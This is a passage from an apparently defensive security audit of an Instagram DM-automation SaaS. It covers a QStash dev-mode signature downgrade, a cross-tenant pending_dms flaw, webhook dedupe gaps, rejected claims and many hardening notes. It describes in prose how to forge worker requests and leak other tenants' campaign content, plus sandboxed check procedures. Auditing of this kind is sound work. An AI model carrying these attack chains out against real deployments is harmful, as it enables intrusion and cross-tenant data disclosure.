- `node_modules/@upstash/qstash/chunk-YEDZVUOH.mjs:1014` — getReceiverSigningKeys returns the development credentials and ignores config.currentSigningKey/nextSigningKey when dev mode is active.
- `package-lock.json:4486` — The lockfile pins @upstash/qstash 2.13.0, the version whose Receiver implements the QSTASH_DEV downgrade.

#### Why it is not confirmed

- Whether QSTASH_DEV is set to "true" or "1" in the Vercel production environment, or in any preview environment that shares the same QStash signing keys. No QSTASH_DEV reference exists anywhere in the repository, and the 2026-11-24 .vercel/.env.production.local snapshot (VERCEL_ENV=production) contains no QSTASH_DEV, but that snapshot also omits every QSTASH_* variable, so it is not authoritative for the live runtime environment.
- Whether the deployment has both QSTASH_CURRENT_SIGNING_KEY and QSTASH_NEXT_SIGNING_KEY configured: verifyQstashRequest returns null before constructing the Receiver when either is empty, so the downgrade is only reachable in a deployment where the worker is otherwise functional.

#### How to resolve it

- **Bounded local check:** Already run under Docker with --network none, read-only target mount, tmpfs scratch, 512m/1cpu/128 pids, cap-drop ALL and no-new-privileges: a script minted HS256 JWTs (iss=Upstash, sub=request URL, body=base64url(sha256(body))) and called new Receiver({currentSigningKey, nextSigningKey}).verify({signature, body, url}) with QSTASH_DEV varied. Results: QSTASH_DEV=true + dev-key signature verified; QSTASH_DEV unset + dev-key signature threw; QSTASH_DEV=true + configured-key signature threw; QSTASH_DEV=false + configured-key signature verified; QSTASH_DEV=1 + dev-key signature verified. Output is agents/v11/artifacts/check-output.json (promoted by the parent; not evidence if promotion fails). Re-run by repeating the same script against /target/node_modules/@upstash/qstash.
- **Owner-observed check:** Owner lists the production and every preview environment's variables and confirms QSTASH_DEV is absent, "false", or "0"; if it is "true"/"1", treat all verifyQstashRequest-gated routes (workers/qstash, send-queued-dm, rerun, drain-dm-queue, qstash-failed, cron/flush-metrics) as anonymously forgeable until the fix ships. Fix: pass devMode: false to the Receiver constructor so the downgrade is impossible regardless of environment.

---

### 4.12 Cross-tenant campaign content disclosure via unbound pending_dms.automation_id

**Fingerprint:** `supabase/migrations/20261125_tier1_core.sql/pending-dms-insert-unbound-automation-id`

#### What it is

An authenticated creator can insert a pending_dms row into their own workspace that references another tenant's automation UUID. The RLS INSERT policy checks only the row's workspace_id, and the service-role DM-queue drain loads the automation by id without re-checking its workspace, so the victim's DM copy is rendered and sent to the attacker's Instagram account while contact, conversation, message, dm_logs and safety rows are written into the victim's workspace. The attacker needs the victim's automation UUID and trigger keyword, which an enabled public report link exposes (campaigns[].id and keywords), and the campaign must be ANY_POST (the schema default) or the attacker must know its post_id.

#### Claimed root cause

The is_workspace_member(workspace_id) INSERT predicate binds only the row's own tenant column; pending_dms.automation_id is not constrained to an automation in the same workspace, and runDmQueueDrain trusts row.automation_id when it loads the automation with the service-role client.

#### Where it lives (source trace)

- **entrypoint** — `supabase/migrations/20261125_tier1_core.sql:155` (RLS INSERT policy for pending_dms): Members insert pending_dms WITH CHECK (public.is_workspace_member(workspace_id)); automation_id is unconstrained, so an authenticated user can reference any automation UUID.
- **propagation** — `app/dashboard/campaigns/actions.ts:322` (drainDmQueueAction): Any authenticated workspace owner can invoke the drain; it verifies only that the caller owns a workspace, then calls runDmQueueDrain(getAdminDb()).
- **propagation** — `lib/dm-queue.ts:130` (runDmQueueDrain): Selects queued pending_dms rows with no workspace predicate (kind=queued, status=pending, next_attempt_at <= now).
- **propagation** — `lib/dm-queue.ts:167` (runDmQueueDrain): Loads the automation by row.automation_id with no workspace filter, so the victim's automation row is returned.
- **propagation** — `lib/dm-queue.ts:203` (runDmQueueDrain): Builds the event from the attacker's comment_events row and account, then calls processCommentEventForAutomation(event, auto) with the victim's automation.
- **sink** — `lib/meta/webhook-processor.ts:2585` (processCommentEventForAutomation): ensureContact(auto.workspaceId, ...) writes a contact into the victim's workspace and sendCommentDm renders auto.dmMessage to the attacker's recipient using the attacker's token.

#### Evidence

- `supabase/migrations/20261125_tier1_core.sql:155` — INSERT policy predicate is is_workspace_member(workspace_id) only.
- `lib/dm-queue.ts:167` — .eq("id", row.automation_id) with no workspace_id condition.
- `lib/meta/webhook-processor.ts:2586` — auto.workspaceId (the victim's workspace) is used for the contact write.
- `lib/public-report.ts:166` — The public report exposes campaigns[].id, i.e. automation UUIDs, supplying the precondition.
- `lib/public-report.ts:250` — The public report exposes trigger keywords, so the attacker can satisfy findMatchingKeyword.

#### Why it is not confirmed

- Whether the live project's pending_dms RLS INSERT policy matches the repository migration; the architecture summary flags RLS application as deployment-dependent, and a stricter live policy or trigger would block the cross-tenant insert.
- Whether a target victim workspace has an enabled public report link whose campaigns[] array exposes an active campaign's automation UUID and trigger keyword; the report does expose both, but the attacker must possess the link and the campaign must have recent activity.
- Whether the target campaign's post_scope is ANY_POST (the schema default) or the attacker knows its post_id; SPECIFIC_POST requires a media id that the public report does not expose.

#### How to resolve it

- **Bounded local check:** With two dummy tenants in a local Supabase/Postgres fixture, insert a pending_dms row as tenant A referencing tenant B's automation id, run runDmQueueDrain with a stubbed Meta client, and assert the rendered DM text equals tenant B's dm_message and that a contacts row appears under tenant B.
- **Owner-observed check:** Owner observes a staging project with two dummy tenants: confirm the pending_dms INSERT succeeds across tenants and that the drain renders tenant B's copy to tenant A's recipient.

---

### 4.13 Webhook dedupe fails open when Redis is unavailable, leaving only a non-atomic DB guard against duplicate DM sends

**Fingerprint:** `webhook/dedupe/fail-open-claim`

#### What it is

claimWebhookEvent is the atomic Redis claim that stops Meta retries from repeating a webhook side effect, but it returns true ("new event") whenever Upstash Redis is unconfigured or errors. In that same state the other Redis-backed guard, checkRecipientCooldown, also fails open, and the remaining fallback guards are non-atomic check-then-act: hasRepliedRecently and the dm_logs 24h query are read before the send, and markReplied is written only after a successful send. A retry that overlaps the first run therefore passes every guard and sends the same private reply twice from the creator's Instagram account, consuming the account's hourly ceiling and raising Meta spam-enforcement risk. The route's QStash path carries an atomic deduplicationId, so the exposure is the after() fallback used when QStash is unavailable or its publish fails.

#### Claimed root cause

lib/dedupe.ts#claimWebhookEvent treats a missing or failing Redis as a successful claim (return true) instead of failing closed or using an atomic fallback store, and the processor's DB duplicate guard is read-before-send with the marker written after the send.

#### Where it lives (source trace)

- **entrypoint** — `app/api/webhook/route.ts:86` (POST /api/webhook): The route calls claimWebhookEvent(dedupeKey) and returns 200 DUPLICATE_IGNORED only when it returns false.
- **propagation** — `lib/dedupe.ts:5` (claimWebhookEvent): Returns true without writing any key when hasUpstashRedis() is false, so no claim exists to reject a retry.
- **propagation** — `lib/dedupe.ts:14` (claimWebhookEvent): Returns true from the catch block, so a Redis error is indistinguishable from a first delivery.
- **propagation** — `lib/meta/webhook-processor.ts:2578` (processCommentEventForAutomation): The fallback duplicate guard reads hasRepliedRecently before dispatching; checkRecipientCooldown (line 2569) and the dm_logs 24h query (lines 2556-2567) are likewise read-only checks that fail open or are non-atomic.
- **propagation** — `lib/meta/webhook-processor.ts:2430` (sendCommentDm): markReplied is written only inside `if (succeeded)`, after the Meta call, so the guard is check-then-act.
- **sink** — `lib/meta/webhook-processor.ts:2419` (sendCommentDm): withRetry(dispatch, 3) posts the private reply; two overlapping runs both reach this point.

#### Evidence

- `lib/dedupe.ts:5` — `if (!hasUpstashRedis()) return true; // DB duplicate guard still applies.` — the claim is skipped entirely.
- `lib/dedupe.ts:14` — `return true;` in the catch block after `[dedupe] Redis claim failed, continuing`.
- `lib/meta/webhook-processor.ts:2578` — `const alreadyReplied = await hasRepliedRecently(...)` is a read-only lookup.
- `lib/meta/webhook-processor.ts:2430` — `await markReplied(...)` runs only after a successful send.
- `app/api/webhook/route.ts:148` — `after(async () => { ... processWebhookPayload(payload) })` runs after the 200, so a Meta retry can overlap the first run.

#### Why it is not confirmed

- Whether the deployment configures UPSTASH_REDIS_REST_URL and UPSTASH_REDIS_REST_TOKEN (hasUpstashRedis). If Redis is configured and reliable, claimWebhookEvent and checkRecipientCooldown are atomic and the double-send does not occur; the exposure is limited to Redis errors.
- Whether the deployment configures QStash. The route's QStash path publishes with an atomic deduplicationId; the after() fallback that the trace relies on is only reached when QStash is unconfigured or its publish fails.
- Whether Redis errors during webhook bursts, which would make claimWebhookEvent and checkRecipientCooldown fail open.

#### How to resolve it

- **Bounded local check:** Bounded in-memory harness: stub hasUpstashRedis() to return false (or stub getRedis().set/get to throw), stub getAdminDb() to return no existing dm_logs row for both calls, stub getAccount/getToken/isOptedOut/matchesPostScope/ensureContact/applyFollowGate to permissive values, stub sendPrivateReply to record calls, then call processCommentEventForAutomation twice concurrently for one dummy workspace/contact/comment and assert two send calls.
- **Owner-observed check:** Owner checks whether UPSTASH_REDIS_REST_URL/TOKEN and QStash are configured for the deployment, and queries dm_logs read-only for two SENT rows with the same automation_id and recipient_id within the same second.

---

### 4.14 One dedupe key is claimed for a whole multi-event webhook payload, so a retried batch drops unprocessed events

**Fingerprint:** `webhook/dedupe/first-entry-key-scope`

#### What it is

`POST /api/webhook` derives a single dedupe key from `entry[0].changes[0].value.id` / `.comment_id` / `entry[0].messaging[0].message.mid` and claims it in Redis for 24 hours before `recordWebhookReceived` and before any entry is processed, while `processWebhookPayload` iterates every entry and every change. The key identifies only the first event of the payload, so a multi-event batch shares one idempotency key. If the route fails after the claim but before returning 200 (e.g., a function timeout or crash), Meta's retry of the same batch derives the same key, `claimWebhookEvent` returns false, and the route answers 200 `DUPLICATE_IGNORED` for the whole payload; no event in that batch is processed and the claim is never released, so the batch is not retried for 24 hours. Because the key is taken from `entry[0]` only, the retry cannot be partially accepted even for events that were never processed. The claim is fail-open when Upstash Redis is unconfigured or errors (`claimWebhookEvent` returns true), so the drop only applies when Redis is configured and healthy. The admin replay endpoint can reprocess a stored `webhook_events` row, but a retry dropped at the claim is never stored, so it does not recover the dropped batch.

#### Claimed root cause

app/api/webhook/route.ts derives the dedupe key from only the first entry/change of the payload and claims it before any entry is processed, so the idempotency key's scope (one event) does not match the processing scope (all entries) and the claim is never released on failure.

#### Where it lives (source trace)

- **entrypoint** — `app/api/webhook/route.ts:82` (POST /api/webhook): dedupeKey is the `??` chain over entry[0].changes[0].value.id, .comment_id and entry[0].messaging[0].message.mid only.
- **propagation** — `app/api/webhook/route.ts:86` (POST /api/webhook): The single key is claimed for 24h before recordWebhookReceived and before any entry is processed.
- **propagation** — `lib/dedupe.ts:7` (claimWebhookEvent): The claim is a single Redis SET NX with a 24h TTL; there is no release/delete path on failure.
- **propagation** — `app/api/webhook/route.ts:94` (POST /api/webhook): recordWebhookReceived and the QStash/after() dispatch happen only after the claim.
- **propagation** — `lib/meta/webhook-processor.ts:3186` (processWebhookPayload): The processor iterates every parsed comment event in the payload.
- **propagation** — `lib/meta/webhook-processor.ts:3287` (processWebhookPayload): and every parsed message event, so one payload can carry many independent events.
- **sink** — `app/api/webhook/route.ts:87` (POST /api/webhook): A retry whose first event was already claimed returns 200 DUPLICATE_IGNORED for the entire payload, so no entry in the batch is processed.

#### Evidence

- `app/api/webhook/route.ts:82` — `const dedupeKey = payload.entry?.[0]?.changes?.[0]?.value?.id ?? ... ?? payload.entry?.[0]?.messaging?.[0]?.message?.mid;`
- `app/api/webhook/route.ts:86` — `if (dedupeKey && !(await claimWebhookEvent(dedupeKey))) {`
- `app/api/webhook/route.ts:88` — `{ success: true, status: "DUPLICATE_IGNORED" }` is returned for the whole payload.
- `lib/dedupe.ts:7` — `const result = await getRedis().set(`dedupe:ig:event:${eventId}`, "1", { nx: true, ex: 24 * 60 * 60 });`
- `lib/meta/webhook-processor.ts:3186` — `for (const event of parseCommentEvents(payload)) {`
- `lib/meta/webhook-processor.ts:3287` — `for (const event of parseMessageEvents(payload)) {`

#### Why it is not confirmed

- Whether Meta batches multiple changes/entries into one POST and re-delivers that same batch after a non-200 or timeout is a third-party delivery fact not visible in source.
- Whether the deployed route can fail after the Redis claim (route.ts:86) but before the 200 response — e.g., a Vercel function timeout or crash — is deployment-observable only; the normal path has no uncaught throw after the claim.

#### How to resolve it

- **Bounded local check:** In the approved sandbox, evaluate the route's key-derivation expression on payload1 = {object:'instagram',entry:[{id:'A',changes:[{field:'comments',value:{id:'C1',media:{id:'M'},from:{id:'U'}}}]}]} and payload2 = the same entry with changes [{...C1},{...C2}]; assert both derive 'C1'. Then simulate claimWebhookEvent with an in-memory NX/EX map: claim('C1') -> true, claim('C1') again -> false, and assert the route's early return would skip processWebhookPayload for payload2. This reproduces the key-scope mismatch and the wholesale drop, but not Meta's delivery.
- **Owner-observed check:** Owner queries webhook_events for payloads with more than one entry/change, correlates FAILED/PENDING rows and Meta retry timestamps with DUPLICATE_IGNORED responses, and checks Vercel logs for 5xx/timeouts on /api/webhook after the claim. Read-only queries and log inspection only.

---

## 5. Claims that were rejected

These claims were proposed during hunting and disproved during independent validation. They are retained so a future run does not repeat the same unsupported claim without new evidence.

### 5.1 Recovery password page lets any authenticated session set a new password without the current one

**Fingerprint:** `auth/password-change/update-password-without-current-password`

**What was claimed:** The recovery landing page is a public route with no recovery-session gate, and UpdatePasswordForm omits current_password, so the same state change has two paths with different reauthentication requirements.

**Why it was rejected:** Every cited line is accurate, but the security conclusion does not follow. The reauthentication requirement is not implemented by either form; it is enforced server-side by Supabase GoTrue when the project setting 'Require current password when changing password' is enabled, and it keys on the ambient session, not on which page submits the request. With the setting enabled, a normal (non-recovery) session that posts updateUser({ password }) from /auth/update-password omits current_password and is rejected by GoTrue exactly as it would be from the settings form, so the recovery page is not a bypass. With the setting disabled, no control exists to bypass: the settings form's current_password field is decorative, as components/settings/change-password-form.tsx:13-18 states and docs/00-overview/EXTERNAL_ACTIONS_BEFORE_LAUNCH.md:73-74 documents ('If Supabase also requires the current password on recovery sessions, keep the setting off and rely on the Settings card instead'), so the recovery page grants no incremental capability over a direct updateUser call. The recovery flow is intentionally exempt from current_password because a user who forgot their password cannot supply it (components/settings/change-password-form.tsx:16-17). The missing project setting is therefore not decisive: both branches yield no incremental vulnerability attributable to the recovery page, and the candidate's own evidence concedes that enforcement is a project setting rather than a form-level check.

**Remediation (2026-11-28):** The app no longer depends on the project setting for either path. `/auth/update-password` now requires a short-lived, signed recovery grant issued only by `/auth/confirm` after a recovery email exchange (`lib/auth/recovery-grant.ts`, `lib/auth/recovery-cookie.ts`); a normal authenticated session is shown the Settings pointer instead. The Settings card now verifies the current password server-side on an isolated client before calling `updateUser` (`app/dashboard/settings/password-actions.ts`), so its current-password field is a real control even when the Supabase setting is off. Both paths revoke other sessions after a successful change. The Supabase "Require current password when changing password" setting is now enabled as defense-in-depth; Supabase intentionally exempts recovery sessions from that check, so the reset flow remains functional.

---

### 5.2 Mutable latest dependency tags feed an install-time script in the build environment

**Fingerprint:** `package.json/mutable-latest-dist-tags-with-postinstall`

**What was claimed:** Three runtime dependencies use the mutable latest dist-tag instead of a pinned range, so dependency resolution is not bound to reviewed source; the package has an install script, so newly resolved code executes during install.

**Why it was rejected:** The cited lines are accurate, but the chain does not establish a supply-chain finding. package-lock.json pins next@16.4.6, @supabase/ssr@0.12.7 and @supabase/supabase-js@2.119.2 to exact versions with sha512 integrity hashes, so the normal install path consumes reviewed, integrity-bound artifacts; the candidate's own blocker admits it does not know whether the build re-resolves. The claimed sink is misidentified: package-lock.json:7 hasInstallScript:true records the root package's own postinstall (prisma generate), which runs the lockfile-pinned Prisma CLI and is independent of what the latest tags resolve to, so it is not a consequence of mutable dependency resolution. The three named packages carry no install script (hasInstallScript is undefined for each), and no lower-trust actor, compromised package, or concrete unauthorized code inclusion or secret disclosure is shown. Per the supply-chain core discipline, a mutable dependency is not a finding by itself; the missing install-command fact is not decisive because even the worst case (npm install re-resolving latest) still requires an unshown registry compromise to produce a security effect. The first trace entry (package.json) is a build manifest, not a lower-trust entrypoint. Source therefore refutes the claimed handoff, so the candidate is rejected rather than held for validation.

---

## 6. Hardening notes

These are concrete improvements that did not meet the bar for a confirmed finding because no lower-trust principal gains a concrete capability. They are still worth fixing.

- `POST /api/admin/deliver-guide` calls `sendOptinDm` without checking `automations.active`, opt-out, hourly cap, account ceiling, recipient cooldown, 24h `dm_logs` dedupe or the follow gate, and it accepts any `recipientId`; the re-run route refuses paused campaigns and the live path applies all of those guards, so the same state change has an inconsistent control set.
- `CRON_SECRET` is a single shared bearer that authorises scheduled cron jobs and privileged admin actions (deliver-guide, webhook-replay, DLQ) and is stored in QStash schedule headers at `app/api/admin/followup-schedule/route.ts:25`; a leak of that one value grants arbitrary DM sending and webhook replay.
- `rerun_jobs` RLS UPDATE grants any `is_workspace_member` full-column update while the API restricts re-run control to `workspaces.owner_id`, and `lib/rerun-runner.ts:199` loads the automation by `job.automation_id` without checking `automationRow.workspace_id === job.workspace_id`; no non-owner member principal exists today because the product only inserts the owner into `workspace_members`.
- `findRerunCandidates` applies `eligible.slice(0, limit)` before the `alreadyContacted`/`optedOut` filter, so after the newest 500 eligible commenters are contacted the re-run reports zero candidates and older eligible commenters are permanently unreachable.
- `getOAuthStateSecrets()` (`lib/config.ts:116-122`) also accepts `LEGACY_VAULT_SECRET` and `DEV_ONLY_SECRET`, both hardcoded in source, and `verifyOAuthState` (`lib/meta/client.ts:121`) accepts any of them; that boundary is owned by the peer OAuth coverage unit and was not assessed here.
- `withCronLock` fails open when Redis is unavailable (`lib/redis-lock.ts:39-42`), so every cron and re-run batch loses its mutual-exclusion guarantee during a Redis outage.
- `lib/meta/webhook-processor.ts:556` falls back to a single global `INSTAGRAM_ACCESS_TOKEN` when an account token is missing or undecryptable; the variable is not in the documented production environment list, so the fallback is latent rather than active.
- lib/qstash-verify.ts should pass devMode: false to Receiver so worker authentication cannot be downgraded by an unrelated environment variable.
- verifyQstashRequest keeps no replay cache; @upstash/qstash documents that a signature stays valid for five minutes and can be replayed in that window. Store the verified upstash-signature value for the validity window if a signed request ever becomes observable to a lower-trust party.
- lib/redis-lock.ts acquireRedisLock returns a synthetic "local" lock when Redis is configured but the SET throws, so withCronLock runs the handler unlocked. A Redis outage therefore permits overlapping follow-up and drain runs; the followup_events unique key limits but does not eliminate duplicate sends.
- app/api/diagnostics/meta-token returns token_meta.length and token_meta.whitespace for decrypted Instagram tokens; drop them or bucket them so token length is not disclosed.
- app/api/diagnostics/meta-token is a GET that performs roughly 55 outbound Meta Graph calls with 10s timeouts and no rate limit, so a leaked CRON_SECRET becomes a request amplifier against the Meta app quota.
- The CRON_SECRET is a single platform-wide credential shared with Vercel cron and copied into QStash schedule headers by app/api/admin/followup-schedule, so a third-party scheduler holds a credential that can read cross-tenant Instagram profile data through /api/diagnostics/meta-token.
- isAdminEmail is also the gate for app/api/admin/alerts/check and app/dashboard/admin/alerts/page.tsx; any fix should land in the shared helper rather than at one call site.
- app/api/admin/dlq POST accepts any dlqId without checking that the message belongs to this deployment's QStash account; QStash account scoping makes this benign today but the check would make the boundary explicit.
- app/api/workers/send-queued-dm trusts a full automation snapshot (workspaceId, dmMessage, buttonUrl, hourlyCap) from the message body; re-reading the automation by id inside the worker would remove the body as a control-plane input even if a signing key were ever compromised.
- app/api/instagram/send-dm/route.ts: the 24h dedupe query uses .eq("automation_id", null), which serializes to automation_id=eq.null and cannot match NULL rows (PostgREST requires .is("automation_id", null)); the query error is ignored, so the 'never re-DM the same person twice in a day' guard never fires.
- app/api/instagram/send-dm/route.ts: the dedupe query is not scoped to workspace_id or instagram_account_id, so if it were fixed it would let one tenant's send block another tenant's send to the same IGSID and act as a cross-tenant activity oracle.
- app/api/inbox/follow-prompt/route.ts: the messages insert uses an unvalidated conversationId, unlike app/api/inbox/reply/route.ts which requires the conversation to belong to the workspace; add the same conversations lookup before inserting.
- app/api/inbox/reply/route.ts: the last-inbound lookup filters only by conversation_id; add workspace_id for defense in depth even though messages RLS scopes by workspace membership.
- app/api/instagram/send-dm/route.ts: the route ignores any workspace selector and always uses the first owned workspace (limit(1)), so multi-workspace owners send from the wrong account and write contacts, conversations, and dm_logs into that workspace.
- app/api/instagram/send-dm/route.ts: manual sends use a separate `${instagram_id}:manual` limiter bucket, so manual traffic can exceed the account's automated hourly cap instead of sharing one per-account budget.
- app/api/assets/sign: the presigned PutObjectCommand omits ContentLength, so the sizeBytes value validated by validateAsset is not bound to the upload; an authenticated creator can store objects larger than the format limit in the operator's R2 bucket. Add ContentLength to the command or a bucket-level max object size.
- lib/cloudflare/r2.ts#isWorkspaceAssetKey is a raw prefix check; it is safe only because S3/R2 keys are opaque. Reject dot segments and double slashes and require the exact generated key shape as defense in depth.
- app/api/health returns a boolean map of which security controls are configured (webhookSigning, tokenVault, cronSecret) to anonymous callers; this is a control-posture disclosure useful for reconnaissance. Consider requiring auth or reducing the field set in production.
- app/dashboard/campaigns/actions.ts#drainDmQueueAction checks only that the caller owns a workspace, then drains the global pending_dms queue and holds the shared dmplease:dmqueue:drain lock; scope the drain to the caller's workspace ids or restrict it to cron.
- supabase/migrations: followup_steps.automation_id, dm_logs.automation_id, conversations.contact_id and messages.conversation_id are likewise unbound by their INSERT policies; no cross-tenant effect was established for those paths, but the same predicate should be tightened.
- lib/meta/profile-sync.ts#syncInstagramProfile should require a workspace-scoped account id and the media route should pass the caller's row id rather than relying on a global most-recently-updated selection.
- app/api/auth/guard/route.ts line 39 uses `action in CAPS`, which accepts inherited Object.prototype keys ('constructor', 'toString', '__proto__'). Use `Object.hasOwn(CAPS, action)` so an unknown action cannot reach limiter construction with a non-numeric cap.
- app/api/auth/guard/route.ts clientIp() trusts the leftmost x-forwarded-for element. If the ingress does not overwrite client-supplied copies, the per-IP bucket is trivially rotated. The limiter is advisory and Supabase Auth is authoritative, so this is hardening; pin the address to a platform-provided header and document the ingress contract.
- POST /api/auth/guard performs one Upstash command per unauthenticated request with no self-limit, so sustained traffic costs operator-owned Redis commands even after the caller's bucket is exhausted. Consider a cheap edge-level cap in front of the endpoint.
- components/login-form.tsx line 36 and app/auth/error/page.tsx line 20 call decodeURIComponent on a query value that Next.js has already decoded. `?error=%` throws URIError and crashes the render (500 on the server component). Wrap in try/catch or drop the extra decode.
- lib/workspace-context.tsx line 47 writes active_workspace_id without Secure or HttpOnly. The value is display-only and re-validated against owned workspaces in app/dashboard/layout.tsx, so there is no cross-tenant effect, but adding Secure keeps the preference from being overwritten over plain HTTP.
- app/dashboard/campaigns/actions.ts toggleCampaignActive (line 306) and deleteCampaign (line 379) perform no getUser() and no ownership check, unlike their siblings updateCampaign and saveFollowupSteps. They rely entirely on RLS; add the same explicit owner_id check so a future RLS regression does not become a cross-tenant write.
- app/dashboard/campaigns/actions.ts drainDmQueueAction lets any authenticated creator trigger runDmQueueDrain against the service-role client, which drains the global all-tenant pending_dms queue. It is bounded to 20 rows and guarded by a Redis lock, so impact is low, but the action is not scoped to the caller's workspace.
- app/api/auth/meta/callback/route.ts lines 16-23 derive `origin` from x-forwarded-host and x-forwarded-proto whenever APP_URL is unset, and line 29 sends that origin to Meta as redirect_uri. Pin the origin to a configured value and ignore forwarded headers for URL construction.
- lib/config.ts getOAuthStateSecret() falls back to TOKEN_VAULT_SECRET, so the AES-256-GCM vault key is reused as the OAuth-state HMAC key when OAUTH_STATE_SECRET is unset. Require a dedicated OAUTH_STATE_SECRET in production.
- lib/config.ts LEGACY_VAULT_SECRET is a hardcoded 64-hex AES key that lib/meta/vault.ts decryptToken still accepts (line 80). Anyone with the repository can decrypt tokens encrypted under it; rotate the vault key and drop the constant.
- lib/meta/vault.ts decryptToken returns any plaintext value starting with EAA or IG without authentication (lines 72-77). app/api/instagram/accounts/connect/route.ts passes body-supplied pageToken through it, so a caller can store an arbitrary plaintext token on their own account row. Reject plaintext and require a vault ciphertext.
- lib/meta/client.ts exchangeOAuthCode (lines 225-233) and getLongLivedToken (lines 301-304) put client_secret in the query string. Use a POST body so the app secret does not appear in proxy or platform request logs.
- lib/meta/client.ts subscribeInstagramAccountToWebhooks interpolates the caller-supplied instagramAccountId into the Graph URL path without encoding (line 699). Encode the path segment so a caller cannot steer the server's authenticated POST to another Graph endpoint.
- app/api/instagram/accounts/connect/route.ts writes webhook_subscribed: true (line 229) even when subscribeInstagramAccountToWebhooks returns {success:false} (line 259), so the stored subscription state can disagree with Meta.
- supabase/migrations/20261123_create_profiles_and_workspaces.sql defines no INSERT policy on workspace_members, so the OWNER upsert at app/api/instagram/accounts/connect/route.ts line 192 silently fails. Ownership still resolves through workspaces.owner_id, but the membership row is missing; add a matching INSERT policy.
- lib/meta/client.ts signOAuthState generates a nonce (line 102) that is never stored or checked, so a state is replayable for its full 10-minute lifetime. Store the nonce server-side or bind the state to the session to make it single-use.
- lib/conversions.ts:17-19 — Buffer.from(signature,'hex') drops a trailing nibble, so appending one hex character to a valid signature still validates. Bind the signature to exactly 64 hex characters (/^[0-9a-f]{64}$/i) to remove the malleability.
- lib/config.ts:92-94 — getVaultSecret() is the single key for AES-256-GCM Instagram-token encryption, workspace-token HMAC, tracked-link HMAC, short-code HMAC, and the OAuth-state fallback. Derive per-purpose keys (e.g. HMAC(secret,'conversions-token')) so exposure of one surface does not weaken the others.
- lib/conversions.ts:8-30 — workspace tokens carry no issued-at, expiry, or revocation claim, so a leaked token grants permanent conversion-write access to the workspace. Add an expiry claim and a rotation path in Settings.
- app/api/conversions/[workspaceToken]/route.ts:218 — the response fields 'attributed' and 'duplicate' are existence oracles over the workspace's contacts and external_event_id values for any holder of the token, which is designed to be pasted into third-party checkouts.
- app/api/conversions/[workspaceToken]/route.ts:17 — metadata is z.record(z.string(), z.unknown()) with no key or byte cap, and the route reads the body with no explicit limit; only the platform request cap bounds it.
- lib/public-report.ts:37-52 — the public payload exposes internal automations.id and instagram_accounts.id UUIDs. Return opaque per-report identifiers instead.
- app/api/reports/[token]/route.ts:9-27 — no rate limit on the public report endpoint; each request runs eight workspace queries plus a preferences read.
- app/go/[slug]/route.ts:56-63 — the redirect target has no scheme allowlist. fallback_button_url (app/dashboard/settings/actions.ts:26, z.url()) and link-rotator targets (app/dashboard/campaigns/link-actions.ts:11-14, z.string().url()) accept javascript:/data:, which NextResponse.redirect emits as a Location header. Restrict to http:/https: at write time and again before redirect.
- lib/meta/link-resolver.ts:90-103 — the Redis cache is consulted before the active filter, so a deactivated short link keeps resolving for up to five minutes after the owner disables it.
- lib/meta/link-resolver.ts:147-152 — the short code is derived from (scope, recipient) only, not the destination, and the upsert uses ignoreDuplicates, so changing a campaign's destination never updates existing short links and followers keep being sent to the old URL.
- app/onboarding/actions.ts#submitOnboarding writes an active automation without the validateCampaign and validateAutomationInput screening that app/dashboard/campaigns/actions.ts#createCampaign enforces; a whitespace-only triggerKeyword becomes [''] which findMatchingKeyword treats as match-all, and post_scope stays null (ANY_POST) with hourly_cap at its unlimited default.
- app/api/instagram/profile/route.ts#PATCH lets a workspace owner set is_verified_manual = true with no Meta verification; it is currently rendered only in the owner's own settings page and campaign preview, so keep it off any public report or DM surface.
- components/auth/turnstile.tsx returns null when NEXT_PUBLIC_TURNSTILE_SITE_KEY is unset, so the auth forms submit with no captchaToken; enforcement depends entirely on Supabase Auth's CAPTCHA setting, which is not represented in the repository.
- components/auth/turnstile.tsx caches the loadTurnstile() promise in module scope, so a single CDN failure leaves a permanently rejected promise and disables the widget for the rest of the page session.
- app/api/cron/insights/route.ts returns error.message from the admin database to the caller; harmless behind the cron secret, but avoid echoing database errors.
- lib/meta/link-resolver.ts#recordTrackedLinkClick pushes to the Redis list link_clicks:buffer with no length cap, and flush-link-clicks is the only drain, so a sustained database outage grows the list without bound.
- app/api/cron/safety-retention/route.ts prunes safety_events at 30 days while docs/09-architecture/SCALING_ARCHITECTURE.md states 90 days; align the documented retention with the job so the audit window is unambiguous.
- isOptedOut returns false on any thrown database error while the sibling recentlyMessaged fails closed, so an opt-out lookup outage permits sends to opted-out recipients.
- consumePending does not compare pending.recipient_id or pending.instagram_account_id with the postback sender and account, so a leaked pending id would release another recipient's content even after the workspace binding is fixed.
- loadPendingGateConfig and releasePendingOptin also dereference pending.rule_id without a workspace predicate, exposing another tenant's rule copy through sendRuleOptinDm.
- matchesRuleKeyword returns true for an empty or whitespace-only keyword, so a dm_rules.keywords entry of "" would match every message and outrank catch-all rules; both creator validation paths reject empty keywords, so this is only reachable by direct database write.
- selectInboundRule commits to one rule; when that rule is throttled by once_per_days or the recipient is opted out, no lower-priority rule or catch-all is tried, so the DM is silently dropped.
- Postback deliveries carry no dedupe key in app/api/webhook/route.ts and consumePending has no claim marker, so a duplicate postback delivered while the first release is in flight can send the same DM twice.
- lib/meta/webhook-processor.ts#consumePending, #loadPendingGateConfig, #releasePendingOptin, #getFollowPromptByPending, #updateFollowPrompt and #countFollowChecksForPending read pending_dms, dm_rules, automations and follow_prompts by id on the service-role client with no workspace predicate; no reachable cross-tenant path was found because the ids come from workspace-scoped rows, but adding `.eq("workspace_id", ...)` would make the isolation explicit.
- lib/meta/webhook-processor.ts#getToken falls back to a process-wide INSTAGRAM_ACCESS_TOKEN when an account has no stored token or decryption fails, so a send can be attempted with a credential that is not bound to the account; failing closed and marking the account for reconnection would be safer.
- lib/config.ts#getWebhookSecrets accepts META_APP_SECRET, INSTAGRAM_APP_SECRET and FACEBOOK_APP_SECRET as three independent HMAC identities; only the secret of the app that owns the webhook should be accepted.
- lib/dedupe.ts keys are global (`dedupe:ig:event:<id>`) with no tenant prefix; Meta ids are globally unique today, but a tenant-scoped key would remove the cross-tenant collision assumption.
- lib/meta/webhook-processor.ts#consumePending does not check `kind` or `recipient_id`, so an OPTIN postback would consume a `collect` row or another recipient's row if such an id were ever obtained; binding both fields would harden the release path.
- lib/meta/webhook-processor.ts#processCommentEventForAutomation trusts the caller-supplied `auto.workspaceId` (from the QStash body in app/api/workers/send-queued-dm) instead of the workspace resolved from the Instagram account; re-deriving it from `account.workspace_id` would remove a body-supplied tenant identity.
